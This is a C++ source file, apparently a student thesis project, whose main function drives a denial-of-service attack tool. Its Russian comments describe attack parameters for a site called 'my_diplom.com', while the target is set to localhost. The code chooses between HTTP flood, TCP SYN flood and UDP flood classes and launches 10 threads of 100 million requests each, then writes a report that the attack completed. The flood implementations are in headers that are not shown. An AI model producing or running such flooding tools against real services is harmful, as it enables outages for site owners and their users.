#include <HttpFlood.h>
#include <TcpSynFlood.h>
#include <UdpFlood.h>
#include <Config.h>
#include <Logger.h>
#include <ReportGenerator.h>

int main() {
    try {
        // Задаем параметры атаки для сайта my_diplom.com
        const std::string targetHost = "127.0.0.1";
        const uint16_t targetPort = 5000; // Порт HTTP по умолчанию
        const size_t threadCount = 10; // Количество потоков для атаки
        const size_t requestCount = 100000000; // Количество запросов на поток
        const std::string attackType = "http"; // Тип атаки (http/tcp_syn/udp)

        // Логируем запуск
        Logger::log("Starting DDOS simulation on some site...");

        // Выбор типа атаки
        if (attackType == "http") {
            Logger::log("Performing HTTP Flood attack...");
            HttpFlood httpFlood(targetHost, targetPort, threadCount, requestCount);
            httpFlood.start();
        } else if (attackType == "tcp_syn") {
            Logger::log("Performing TCP SYN Flood attack...");
            TcpSynFlood tcpSynFlood(targetHost, targetPort, threadCount, requestCount);
            tcpSynFlood.start();
        } else if (attackType == "udp") {
            Logger::log("Performing UDP Flood attack...");
            UdpFlood udpFlood(targetHost, targetPort, threadCount, requestCount);
            udpFlood.start();
        } else {
            throw std::runtime_error("Invalid attack type");
        }

        // Генерация отчёта
        Logger::log("Generating report...");
        ReportGenerator::generateReport("report.txt", "Attack on my_diplom.com completed successfully");

        // Завершаем
        Logger::log("DDOS simulation finished!");
    } catch (const std::exception& ex) {
        Logger::log(std::string("Error: ") + ex.what());
    }

    return 0;
}
